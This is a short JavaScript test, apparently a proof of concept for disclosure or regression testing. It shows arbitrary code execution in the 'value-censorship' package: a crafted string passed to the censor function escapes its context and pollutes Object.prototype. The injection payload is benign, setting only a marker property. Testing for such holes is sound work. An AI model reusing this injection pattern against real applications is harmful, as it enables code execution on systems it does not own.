//
test("Arbitrary code execution in  value-censorship", () => {
  const censor = require("value-censorship");
  expect({}.polluted).toBe(undefined);

  try {
    censor(`
        ;1 +(Object.prototype.polluted = 'yes')//
        `);
  } catch (error) {
    //console.log(error);
  }

  expect({}.polluted).toBe("yes");
});
